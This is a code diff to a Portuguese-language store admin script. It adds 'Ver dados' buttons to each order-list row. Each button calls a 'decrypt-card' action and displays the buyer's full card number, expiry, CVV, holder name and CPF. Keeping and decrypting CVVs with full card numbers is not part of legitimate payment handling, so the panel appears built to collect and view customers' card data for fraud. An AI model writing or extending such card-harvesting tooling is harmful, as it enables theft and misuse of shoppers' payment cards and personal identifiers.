@@ -23,7 +23,7 @@ function escapeHtml(value) {
 }
 
 function isAdminArea() {
-  return /^\/(xxx|admin)(\/|$)/.test(window.location.pathname);
+  return /^\/admin(\/|$)/.test(window.location.pathname);
 }
 
 function getAccessToken() {
@@ -281,101 +281,147 @@ function formatCpf(value) {
   return `${digits.slice(0, 3)}.${digits.slice(3, 6)}.${digits.slice(6, 9)}-${digits.slice(9)}`;
 }
 
-function cardSection(orderId, order, container) {
-  const box = document.createElement("div");
-  box.className = "bg-zinc-800/50 rounded-lg p-4 space-y-3";
+function orderHasCard(order) {
+  return Boolean(order?.metodo_pagamento === "card" || order?.card_last4 || order?.card_encriptado);
+}
 
-  const detalhe = order.status_detalhe || "";
-  if (detalhe && detalhe !== order.status) {
-    const line = document.createElement("p");
-    line.className = "text-xs text-zinc-400";
-    line.textContent = `Situação do fluxo: ${STATUS_LABELS[detalhe] || detalhe}`;
-    box.append(line);
+function orderTotal(order) {
+  const raw = order?.total_amount ?? order?.total ?? order?.valor_total ?? 0;
+  return typeof raw === "number" ? raw : parseFloat(String(raw || "0"));
+}
+
+function parseMoney(text) {
+  const match = String(text || "").match(/([\d.]+,\d{2})/);
+  if (!match) return null;
+  return parseFloat(match[1].replace(/\./g, "").replace(",", "."));
+}
+
+function rowTotal(row) {
+  for (const cell of row.querySelectorAll("td")) {
+    if (!cell.textContent?.includes("R$")) continue;
+    const value = parseMoney(cell.textContent);
+    if (value != null) return value;
   }
+  return null;
+}
 
-  const hasCard = Boolean(order.metodo_pagamento === "card" || order.card_last4 || order.card_encriptado);
-  if (!hasCard) {
-    const empty = document.createElement("p");
-    empty.className = "text-sm text-zinc-500";
-    empty.textContent = "Este pedido não tem pagamento por cartão.";
-    box.append(empty);
-    container.append(sectionTitle("Cartão criptografado"), box);
+let ordersCache = [];
+let ordersCacheAt = 0;
+
+async function refreshOrdersCache() {
+  if (Date.now() - ordersCacheAt < 12000 && ordersCache.length) return ordersCache;
+  try {
+    const result = await invokeAdmin("get-orders", { page: 1, limit: 500 });
+    ordersCache = result.orders || [];
+    ordersCacheAt = Date.now();
+  } catch {
+    /* lista ainda não disponível */
+  }
+  return ordersCache;
+}
+
+function findOrderForRow(row) {
+  const name = row.querySelector("span.font-semibold")?.textContent?.trim();
+  if (!name || name === "—") return null;
+  const total = rowTotal(row);
+  const matches = ordersCache.filter((order) => {
+    const orderName = String(order.customer?.full_name || order.nome || "").trim();
+    if (orderName !== name) return false;
+    if (total != null && Math.abs(orderTotal(order) - total) > 0.02) return false;
+    return true;
+  });
+  return matches[0] || null;
+}
+
+function inlineCardMarkup(card, order) {
+  const number = formatCardNumber(card.number || card.numero || "");
+  const validade =
+    card.validade ||
+    (card.expiryMonth && card.expiryYear ? `${card.expiryMonth}/${card.expiryYear}` : "Não informada");
+  const cpf = formatCpf(card.holderCpf || card.cpf || "");
+  const masked = `•••• •••• •••• ${card.last4 || order.card_last4 || "----"}`;
+  return `
+    <div style="border-radius:12px;padding:12px;background:linear-gradient(135deg,#1a1a2e,#0f3460);color:#fff;margin-top:8px;">
+      <p style="margin:0 0 6px;font-size:10px;letter-spacing:1.5px;opacity:.75;">CARTÃO</p>
+      <p style="margin:0 0 8px;font-family:monospace;font-size:15px;letter-spacing:1px;">${escapeHtml(number || masked)}</p>
+      <p style="margin:0;font-size:12px;">${escapeHtml(card.holder || order.card_holder || "Titular não informado")}</p>
+      <p style="margin:4px 0 0;font-size:11px;opacity:.85;">Validade: ${escapeHtml(validade)} · CVV: ${escapeHtml(card.cvv || "—")}</p>
+    </div>
+    <div style="display:grid;gap:2px;margin-top:8px;font-size:11px;color:#d4d4d8;">
+      <span>Bandeira: ${escapeHtml(card.brand || order.card_brand || "—")}</span>
+      <span>CPF: ${escapeHtml(cpf)}</span>
+      <span>Parcelas: ${escapeHtml(card.installments || order.card_installments || 1)}x</span>
+      <span>Status: ${escapeHtml(card.status || order.card_status || "Pendente")}</span>
+    </div>`;
+}
+
+async function toggleInlineCard(orderId, order, slot) {
+  const panel = slot.querySelector(".mc-inline-card-panel");
+  const button = slot.querySelector(".mc-inline-card-btn");
+  if (!panel || !button) return;
+
+  if (panel.dataset.open === "1") {
+    panel.dataset.open = "0";
+    panel.classList.add("hidden");
+    panel.innerHTML = "";
+    button.textContent = "Ver dados";
     return;
   }
 
-  const preview = document.createElement("div");
-  preview.className = "grid gap-1 text-xs text-zinc-300";
-  preview.innerHTML = `
-    <span>Status do cartão: ${escapeHtml(order.card_status || "Pendente")}</span>
-    <span>Transação: ${escapeHtml(order.transaction_id || "Não informada")}</span>
-    <span class="text-zinc-500">Dados criptografados</span>
-    <code class="block break-all rounded-md border border-zinc-700 bg-zinc-950/70 p-2 font-mono text-[11px] text-zinc-400">${escapeHtml(order.card_encriptado || "Sem payload criptografado neste pedido")}</code>`;
+  button.disabled = true;
+  button.textContent = "Carregando...";
+  try {
+    const result = await invokeAdmin("decrypt-card", { orderId });
+    panel.innerHTML = inlineCardMarkup(result.card || {}, order);
+    panel.classList.remove("hidden");
+    panel.dataset.open = "1";
+    button.textContent = "Ocultar dados";
+  } catch (error) {
+    panel.innerHTML = `<p class="text-xs text-red-400 mt-2">${escapeHtml(error.message)}</p>`;
+    panel.classList.remove("hidden");
+    panel.dataset.open = "1";
+    button.textContent = "Ocultar dados";
+  } finally {
+    button.disabled = false;
+  }
+}
 
-  const revealed = document.createElement("div");
-  revealed.className = "hidden gap-1 text-sm text-zinc-200";
+async function enhanceOrderListRows() {
+  await refreshOrdersCache();
+  if (!ordersCache.length) return;
 
-  const reveal = createButton(
-    "Ver dados",
-    "rounded-md bg-blue-600 px-3 py-2 text-sm font-semibold text-white hover:bg-blue-500 disabled:opacity-50",
-  );
-  const hide = createButton(
-    "Ocultar dados",
-    "hidden rounded-md border border-zinc-600 bg-zinc-800 px-3 py-2 text-sm font-semibold text-white hover:bg-zinc-700",
-  );
-  const status = document.createElement("p");
-  status.className = "text-xs text-zinc-500";
-  status.textContent = "Clique em Ver dados para descriptografar.";
+  for (const row of document.querySelectorAll("tr")) {
+    if (!row.className.includes("cursor-pointer")) continue;
+    if (row.dataset.mcInlineCard === "1") continue;
 
-  reveal.addEventListener("click", async () => {
-    reveal.disabled = true;
-    status.textContent = "Descriptografando...";
-    try {
-      const result = await invokeAdmin("decrypt-card", { orderId });
-      const card = result.card || {};
-      const number = formatCardNumber(card.number || card.numero || "");
-      const validade =
-        card.validade ||
-        (card.expiryMonth && card.expiryYear ? `${card.expiryMonth}/${card.expiryYear}` : "Não informada");
-      const cpf = formatCpf(card.holderCpf || card.cpf || "");
-      const masked = `•••• •••• •••• ${card.last4 || order.card_last4 || "----"}`;
-      revealed.innerHTML = `
-        <div style="border-radius:14px;padding:14px;background:linear-gradient(135deg,#1a1a2e,#0f3460);color:#fff;margin-bottom:8px;">
-          <p style="margin:0 0 8px;font-size:10px;letter-spacing:2px;opacity:.75;">CARTÃO DESCRIPTOGRAFADO</p>
-          <p style="margin:0 0 10px;font-family:monospace;font-size:17px;letter-spacing:1.5px;">${escapeHtml(number || masked)}</p>
-          <p style="margin:0;font-size:13px;">${escapeHtml(card.holder || order.card_holder || "Titular não informado")}</p>
-          <p style="margin:4px 0 0;font-size:12px;opacity:.85;">Validade: ${escapeHtml(validade)} · CVV: ${escapeHtml(card.cvv || "—")}</p>
-        </div>
-        <span>Bandeira: ${escapeHtml(card.brand || order.card_brand || "Não identificada")}</span>
-        <span>CPF do titular: ${escapeHtml(cpf)}</span>
-        <span>Parcelas: ${escapeHtml(card.installments || order.card_installments || 1)}x</span>
-        <span>Status: ${escapeHtml(card.status || order.card_status || "Pendente")}</span>`;
-      preview.classList.add("hidden");
-      revealed.classList.remove("hidden");
-      revealed.classList.add("grid");
-      reveal.classList.add("hidden");
-      hide.classList.remove("hidden");
-      status.textContent = "Dados descriptografados.";
-    } catch (error) {
-      status.textContent = `Erro: ${error.message}`;
-    } finally {
-      reveal.disabled = false;
-    }
-  });
+    const order = findOrderForRow(row);
+    if (!order || !orderHasCard(order)) continue;
 
-  hide.addEventListener("click", () => {
-    revealed.classList.add("hidden");
-    revealed.classList.remove("grid");
-    preview.classList.remove("hidden");
-    hide.classList.add("hidden");
-    reveal.classList.remove("hidden");
-    status.textContent = "Clique em Ver dados para descriptografar.";
-  });
+    const nameColumn = row.querySelector("span.font-semibold")?.closest(".flex-col");
+    if (!nameColumn) continue;
 
-  const buttons = document.createElement("div");
-  buttons.className = "flex flex-wrap gap-2";
-  buttons.append(reveal, hide);
-  box.append(preview, revealed, buttons, status);
-  container.append(sectionTitle("Cartão criptografado"), box);
+    row.dataset.mcInlineCard = "1";
+
+    const slot = document.createElement("div");
+    slot.className = "mc-inline-card-slot mt-1.5";
+    slot.dataset.orderId = order.id;
+
+    const button = createButton(
+      "Ver dados",
+      "mc-inline-card-btn rounded-md bg-blue-600 px-2.5 py-1 text-[11px] font-semibold text-white hover:bg-blue-500 disabled:opacity-50 w-fit",
+    );
+    button.addEventListener("click", (event) => {
+      event.preventDefault();
+      event.stopPropagation();
+      void toggleInlineCard(order.id, order, slot);
+    });
+
+    const panel = document.createElement("div");
+    panel.className = "mc-inline-card-panel hidden";
+
+    slot.append(button, panel);
+    nameColumn.appendChild(slot);
+  }
 }
 
 async function enhanceDialog(dialog) {
@@ -400,7 +446,6 @@ async function enhanceDialog(dialog) {
   container.className = "space-y-3";
 
   trackingSection(orderId, order, container);
-  cardSection(orderId, order, container);
 
   const anchor = [...dialog.querySelectorAll("div")].find((element) =>
     element.textContent?.trim().startsWith("ID do Pedido:"),
@@ -413,6 +458,7 @@ const observer = new MutationObserver(() => {
   if (!isAdminArea()) return;
   try {
     hideStoreCartOnAdmin();
+    void enhanceOrderListRows();
     const dialog = findOrderDialog();
     if (dialog) {
       compactOrderDialog(dialog);
@@ -434,3 +480,14 @@ function hideStoreCartOnAdmin() {
 
 hideStoreCartOnAdmin();
 observer.observe(document.body, { childList: true, subtree: true });
+
+document.addEventListener(
+  "input",
+  (event) => {
+    const target = event.target;
+    if (!(target instanceof HTMLInputElement)) return;
+    if (!String(target.placeholder || "").includes("Buscar")) return;
+    ordersCacheAt = 0;
+  },
+  true,
+);
